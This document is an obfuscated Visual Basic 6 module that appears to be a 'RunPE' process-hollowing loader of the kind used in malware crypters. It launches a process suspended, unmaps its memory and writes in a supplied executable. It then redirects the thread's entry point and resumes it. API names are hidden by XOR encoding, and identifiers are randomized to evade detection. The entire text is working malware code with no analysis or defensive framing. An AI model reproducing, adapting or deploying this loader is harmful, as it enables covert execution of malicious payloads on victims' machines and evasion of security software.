Attribute VB_Name = "adferyjhgascxzbnklop"
Option Explicit

Private Const P6e0X8CwKNbvISNqGYsMGyb As Long = &H10007
Private Const k6j7Z3ZERQgjmeDSLudfAch As Integer = 260
Private Const u1a7b2oLKlTkWaBbmgySnMF As Long = &H4
Private Const W6N6W5EbdKejrhNWWVavELp As Long = &H1000
Private Const D0S4Y3oEvgPRlOTgdMZaiuX As Long = &H2000
Private Const q4u2m2XRjTpZkqmwPdlmvUP As Long = &H40

Private Declare Function s8a6A1wdYZXcNUbrTSiYbSr Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As e5t8A7QfYIqsNpuIFnBaaCK, lpProcessInformation As y4Z1y3GvLVEEqqSanPjOmEQ) As Long
Private Declare Function U0v5T7eVjtccPPqMnHmLcod Lib "kernel32" (ByVal P3J6w7aILfIMaWFTssTcoRkess As Long, lpBaseAddress As Any, c0Z4B6lpPpBuNKgDbTPbrHc As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function a3m6G7BHDOfgCDNkRuLqwRY Lib "kernel32" Alias "a3m6G7BHDOfgCDNkRuLqwRYA" (ByVal lpOutputString As String) As Long

Public Declare Sub O8p7n8eXeJjVkorjIkQAykF Lib "kernel32" (Dest As Any, Src As Any, ByVal L As Long)
Private Declare Function u6A2s7fStPcqYpbfFtqkDAX Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function s3X3e6vSUdnhLbtOhbRvGGF Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function l4P4B2NdgjbAPIracvZdrCX Lib "kernel32" (ByVal lpLibFileName As String) As Long

Private Type a7K8I5aEFlGLTJowwvCYfmR
nLength As Long
lpSecurityDescriptor As Long
bInheritHandle As Long
End Type

Private Type e5t8A7QfYIqsNpuIFnBaaCK
cb As Long
lpReserved As Long
lpDesktop As Long
lpTitle As Long
dwX As Long
dwY As Long
dwXSize As Long
dwYSize As Long
dwXCountChars As Long
dwYCountChars As Long
dwFillAttribute As Long
dwFlags As Long
wShowWindow As Integer
cbReserved2 As Integer
lpReserved2 As Long
hStdInput As Long
hStdOutput As Long
hStdError As Long
End Type

Private Type y4Z1y3GvLVEEqqSanPjOmEQ
P3J6w7aILfIMaWFTssTcoRkess As Long
hThread As Long
dwProcessId As Long
dwThreadID As Long
End Type

Private Type F0y2L6RciepHIdfoMsWmTZs
ControlWord As Long
StatusWord As Long
TagWord As Long
ErrorOffset As Long
ErrorSelector As Long
DataOffset As Long
DataSelector As Long
RegisterArea(1 To 80) As Byte
Cr0NpxState As Long
End Type

Private Type B7V3R3UGGkLvMQTLjNrbXMg
k3n1f1RLdNjTdjfrJXfgpNI As Long

Dr0 As Long
Dr1 As Long
Dr2 As Long
Dr3 As Long
Dr6 As Long
Dr7 As Long

FloatSave As F0y2L6RciepHIdfoMsWmTZs
SegGs As Long
SegFs As Long
SegEs As Long
SegDs As Long
Edi As Long
Esi As Long
Ebx As Long
Edx As Long
Ecx As Long
Eax As Long
Ebp As Long
Eip As Long
SegCs As Long
EFlags As Long
Esp As Long
SegSs As Long
End Type

Private Type W2b6U3HtVrESARDHgVSMebU
e_magic As Integer
e_cblp As Integer
e_cp As Integer
e_crlc As Integer
e_cparhdr As Integer
e_minalloc As Integer
e_maxalloc As Integer
e_ss As Integer
e_sp As Integer
e_csum As Integer
e_ip As Integer
e_cs As Integer
e_lfarlc As Integer
e_ovno As Integer
e_res(0 To 3) As Integer
e_oemid As Integer
e_oeminfo As Integer
e_res2(0 To 9) As Integer
e_lfanew As Long
End Type

Private Type O3Q5e8PQajeIXqLdYOtCDBG
Machine As Integer
NumberOfSections As Integer
TimeDateStamp As Long
PointerToSymbolTable As Long
NumberOfSymbols As Long
SizeOfOptionalHeader As Integer
characteristics As Integer
End Type

Private Type r6r4i6wCFyVkdNuwSuNXsGs
Virtuap1F5L4bYjBCXYhGmQfMSltj As Long
Size As Long
End Type

Private Type f1c5E6DosSsEwQNjGeWSeyK
Magic As Integer
MajorLinkerVersion As Byte
MinorLinkerVersion As Byte
SizeOfCode As Long
SizeOfInitializedData As Long
SizeOfUnitializedData As Long
AddressOfEntryPoint As Long
BaseOfCode As Long
BaseOfData As Long
ImageBase As Long
SectionAlignment As Long
FileAlignment As Long
MajorOperatingSystemVersion As Integer
MinorOperatingSystemVersion As Integer
MajorImageVersion As Integer
MinorImageVersion As Integer
MajorSubsystemVersion As Integer
MinorSubsystemVersion As Integer
W32VersionValue As Long
SizeOfImage As Long
SizeOfHeaders As Long
CheckSum As Long
SubSystem As Integer
DllCharacteristics As Integer
SizeOfStackReserve As Long
SizeOfStackCommit As Long
SizeOfHeapReserve As Long
SizeOfHeapCommit As Long
LoaderFlags As Long
NumberOfRvaAndSizes As Long
DataDirectory(0 To 15) As r6r4i6wCFyVkdNuwSuNXsGs
End Type

Private Type f3c0u4aHbgoeKTTSWtBImOS
Signature As Long
FileHeader As O3Q5e8PQajeIXqLdYOtCDBG
OptionalHeader As f1c5E6DosSsEwQNjGeWSeyK
End Type

Private Type q1i1U2gQmWhmjuMaijsRMoq
SecName As String * 8
VirtualSize As Long
Virtuap1F5L4bYjBCXYhGmQfMSltj As Long
SizeOfRawData As Long
PointerToRawData As Long
PointerToRelocations As Long
PointerToLinenumbers As Long
NumberOfRelocations As Integer
NumberOfLinenumbers As Integer
characteristics As Long
End Type


Public Function X5v1u4VWUZKRYoQPfVXPoRy(ByVal LMPG As String, ByVal IWLZW As String, ParamArray YSQJYXT()) As Long
Dim s2I5O4fbmEFablJpTiPWovm As Long, NMQE(&HEC00& - 1) As Byte, YLA As Long, t5Q6b3gqZYMMnyIkEjIZlZX As Long

t5Q6b3gqZYMMnyIkEjIZlZX = s3X3e6vSUdnhLbtOhbRvGGF(l4P4B2NdgjbAPIracvZdrCX(LMPG), IWLZW)
If t5Q6b3gqZYMMnyIkEjIZlZX = 0 Then Exit Function

s2I5O4fbmEFablJpTiPWovm = VarPtr(NMQE(0))
O8p7n8eXeJjVkorjIkQAykF ByVal s2I5O4fbmEFablJpTiPWovm, &H59595958, &H4: s2I5O4fbmEFablJpTiPWovm = s2I5O4fbmEFablJpTiPWovm + 4
O8p7n8eXeJjVkorjIkQAykF ByVal s2I5O4fbmEFablJpTiPWovm, &H5059, &H2: s2I5O4fbmEFablJpTiPWovm = s2I5O4fbmEFablJpTiPWovm + 2
For YLA = UBound(YSQJYXT) To 0 Step -1
O8p7n8eXeJjVkorjIkQAykF ByVal s2I5O4fbmEFablJpTiPWovm, &H68, &H1: s2I5O4fbmEFablJpTiPWovm = s2I5O4fbmEFablJpTiPWovm + 1
O8p7n8eXeJjVkorjIkQAykF ByVal s2I5O4fbmEFablJpTiPWovm, CLng(YSQJYXT(YLA)), &H4: s2I5O4fbmEFablJpTiPWovm = s2I5O4fbmEFablJpTiPWovm + 4
Next
O8p7n8eXeJjVkorjIkQAykF ByVal s2I5O4fbmEFablJpTiPWovm, &HE8, &H1: s2I5O4fbmEFablJpTiPWovm = s2I5O4fbmEFablJpTiPWovm + 1
O8p7n8eXeJjVkorjIkQAykF ByVal s2I5O4fbmEFablJpTiPWovm, t5Q6b3gqZYMMnyIkEjIZlZX - s2I5O4fbmEFablJpTiPWovm - 4, &H4: s2I5O4fbmEFablJpTiPWovm = s2I5O4fbmEFablJpTiPWovm + 4
O8p7n8eXeJjVkorjIkQAykF ByVal s2I5O4fbmEFablJpTiPWovm, &HC3, &H1: s2I5O4fbmEFablJpTiPWovm = s2I5O4fbmEFablJpTiPWovm + 1
X5v1u4VWUZKRYoQPfVXPoRy = u6A2s7fStPcqYpbfFtqkDAX(VarPtr(NMQE(0)), 0, 0, 0, 0)
End Function

Public Function S2O2R0yDgIsJNQHgJoYUJdT(ByVal ZJFFGD As String, ByVal KOKVP As String) As String
Dim K4i3R0qRnBPvOAEdSPJbYuR As Long

For K4i3R0qRnBPvOAEdSPJbYuR = 1 To Len(ZJFFGD)
S2O2R0yDgIsJNQHgJoYUJdT = S2O2R0yDgIsJNQHgJoYUJdT & Chr(Asc(Mid(KOKVP, IIf(K4i3R0qRnBPvOAEdSPJbYuR Mod Len(KOKVP) <> 0, K4i3R0qRnBPvOAEdSPJbYuR Mod Len(KOKVP), Len(KOKVP)), 1)) Xor Asc(Mid(ZJFFGD, K4i3R0qRnBPvOAEdSPJbYuR, 1)))
Next K4i3R0qRnBPvOAEdSPJbYuR
End Function

Public Sub p8r0H3qsCLGjASmGApVeech(ByVal RGJTT As String, ByRef DSQM() As Byte, RCWWX As String)
Dim T2T8K1ZdgYvMFoWZtWaoUhU As Long, EIVO As W2b6U3HtVrESARDHgVSMebU, H6E0f2eQUtUfZroMhGwuGXl As f3c0u4aHbgoeKTTSWtBImOS, H8E5W0CiDIQGluutwVcjOaa As q1i1U2gQmWhmjuMaijsRMoq
Dim L2S1i8qaILfIMaWFTssTcoR As e5t8A7QfYIqsNpuIFnBaaCK, FMKWKE As y4Z1y3GvLVEEqqSanPjOmEQ, HXZODR As B7V3R3UGGkLvMQTLjNrbXMg

L2S1i8qaILfIMaWFTssTcoR.cb = Len(L2S1i8qaILfIMaWFTssTcoR)
O8p7n8eXeJjVkorjIkQAykF EIVO, DSQM(0), 64
O8p7n8eXeJjVkorjIkQAykF H6E0f2eQUtUfZroMhGwuGXl, DSQM(EIVO.e_lfanew), 248

s8a6A1wdYZXcNUbrTSiYbSr RGJTT, " " & RCWWX, 0, 0, False, u1a7b2oLKlTkWaBbmgySnMF, 0, 0, L2S1i8qaILfIMaWFTssTcoR, FMKWKE
X5v1u4VWUZKRYoQPfVXPoRy S2O2R0yDgIsJNQHgJoYUJdT(Chr(36) & Chr(34) & Chr(50) & Chr(35) & Chr(63), "JVVOSRVJUFGPVLPUNIQRXXKFYLBLZQKQRULNCKFCEXPOEDYMWHZJGWSXIKKLIQT"), S2O2R0yDgIsJNQHgJoYUJdT(Chr(4) & Chr(34) & Chr(3) & Chr(33) & Chr(62) & Chr(51) & Chr(38) & Chr(28) & Chr(60) & Chr(35) & Chr(48) & Chr(31) & Chr(48) & Chr(31) & Chr(53) & Chr(54) & Chr(58) & Chr(32) & Chr(62) & Chr(60), "JVVOSRVJUFGPVLPUNIQRXXKFYLBLZQKQRULNCKFCEXPOEDYMWHZJGWSXIKKLIQT"), FMKWKE.P3J6w7aILfIMaWFTssTcoRkess, H6E0f2eQUtUfZroMhGwuGXl.OptionalHeader.ImageBase
X5v1u4VWUZKRYoQPfVXPoRy S2O2R0yDgIsJNQHgJoYUJdT(Chr(33) & Chr(51) & Chr(36) & Chr(33) & Chr(54) & Chr(62) & Chr(101) & Chr(120), "JVVOSRVJUFGPVLPUNIQRXXKFYLBLZQKQRULNCKFCEXPOEDYMWHZJGWSXIKKLIQT"), S2O2R0yDgIsJNQHgJoYUJdT(Chr(28) & Chr(63) & Chr(36) & Chr(59) & Chr(38) & Chr(51) & Chr(58) & Chr(11) & Chr(57) & Chr(42) & Chr(40) & Chr(51) & Chr(19) & Chr(52), "JVVOSRVJUFGPVLPUNIQRXXKFYLBLZQKQRULNCKFCEXPOEDYMWHZJGWSXIKKLIQT"), FMKWKE.P3J6w7aILfIMaWFTssTcoRkess, H6E0f2eQUtUfZroMhGwuGXl.OptionalHeader.ImageBase, H6E0f2eQUtUfZroMhGwuGXl.OptionalHeader.SizeOfImage, W6N6W5EbdKejrhNWWVavELp Or D0S4Y3oEvgPRlOTgdMZaiuX, q4u2m2XRjTpZkqmwPdlmvUP
U0v5T7eVjtccPPqMnHmLcod FMKWKE.P3J6w7aILfIMaWFTssTcoRkess, ByVal H6E0f2eQUtUfZroMhGwuGXl.OptionalHeader.ImageBase, DSQM(0), H6E0f2eQUtUfZroMhGwuGXl.OptionalHeader.SizeOfHeaders, 0

For T2T8K1ZdgYvMFoWZtWaoUhU = 0 To H6E0f2eQUtUfZroMhGwuGXl.FileHeader.NumberOfSections - 1
O8p7n8eXeJjVkorjIkQAykF H8E5W0CiDIQGluutwVcjOaa, DSQM(EIVO.e_lfanew + 248 + 40 * T2T8K1ZdgYvMFoWZtWaoUhU), Len(H8E5W0CiDIQGluutwVcjOaa)
U0v5T7eVjtccPPqMnHmLcod FMKWKE.P3J6w7aILfIMaWFTssTcoRkess, ByVal H6E0f2eQUtUfZroMhGwuGXl.OptionalHeader.ImageBase + H8E5W0CiDIQGluutwVcjOaa.Virtuap1F5L4bYjBCXYhGmQfMSltj, DSQM(H8E5W0CiDIQGluutwVcjOaa.PointerToRawData), H8E5W0CiDIQGluutwVcjOaa.SizeOfRawData, 0
Next T2T8K1ZdgYvMFoWZtWaoUhU

HXZODR.k3n1f1RLdNjTdjfrJXfgpNI = P6e0X8CwKNbvISNqGYsMGyb
X5v1u4VWUZKRYoQPfVXPoRy S2O2R0yDgIsJNQHgJoYUJdT(Chr(33) & Chr(51) & Chr(36) & Chr(33) & Chr(54) & Chr(62) & Chr(101) & Chr(120), "JVVOSRVJUFGPVLPUNIQRXXKFYLBLZQKQRULNCKFCEXPOEDYMWHZJGWSXIKKLIQT"), S2O2R0yDgIsJNQHgJoYUJdT(Chr(13) & Chr(51) & Chr(34) & Chr(27) & Chr(59) & Chr(32) & Chr(51) & Chr(43) & Chr(49) & Chr(5) & Chr(40) & Chr(62) & Chr(34) & Chr(41) & Chr(40) & Chr(33), "JVVOSRVJUFGPVLPUNIQRXXKFYLBLZQKQRULNCKFCEXPOEDYMWHZJGWSXIKKLIQT"), FMKWKE.hThread, VarPtr(HXZODR)
U0v5T7eVjtccPPqMnHmLcod FMKWKE.P3J6w7aILfIMaWFTssTcoRkess, ByVal HXZODR.Ebx + 8, H6E0f2eQUtUfZroMhGwuGXl.OptionalHeader.ImageBase, 4, 0
HXZODR.Eax = H6E0f2eQUtUfZroMhGwuGXl.OptionalHeader.ImageBase + H6E0f2eQUtUfZroMhGwuGXl.OptionalHeader.AddressOfEntryPoint
X5v1u4VWUZKRYoQPfVXPoRy S2O2R0yDgIsJNQHgJoYUJdT(Chr(33) & Chr(51) & Chr(36) & Chr(33) & Chr(54) & Chr(62) & Chr(101) & Chr(120), "JVVOSRVJUFGPVLPUNIQRXXKFYLBLZQKQRULNCKFCEXPOEDYMWHZJGWSXIKKLIQT"), S2O2R0yDgIsJNQHgJoYUJdT(Chr(25) & Chr(51) & Chr(34) & Chr(27) & Chr(59) & Chr(32) & Chr(51) & Chr(43) & Chr(49) & Chr(5) & Chr(40) & Chr(62) & Chr(34) & Chr(41) & Chr(40) & Chr(33), "JVVOSRVJUFGPVLPUNIQRXXKFYLBLZQKQRULNCKFCEXPOEDYMWHZJGWSXIKKLIQT"), FMKWKE.hThread, VarPtr(HXZODR)
X5v1u4VWUZKRYoQPfVXPoRy S2O2R0yDgIsJNQHgJoYUJdT(Chr(33) & Chr(51) & Chr(36) & Chr(33) & Chr(54) & Chr(62) & Chr(101) & Chr(120), "JVVOSRVJUFGPVLPUNIQRXXKFYLBLZQKQRULNCKFCEXPOEDYMWHZJGWSXIKKLIQT"), S2O2R0yDgIsJNQHgJoYUJdT(Chr(24) & Chr(51) & Chr(37) & Chr(58) & Chr(62) & Chr(55) & Chr(2) & Chr(34) & Chr(39) & Chr(35) & Chr(38) & Chr(52), "JVVOSRVJUFGPVLPUNIQRXXKFYLBLZQKQRULNCKFCEXPOEDYMWHZJGWSXIKKLIQT"), FMKWKE.hThread
End Sub


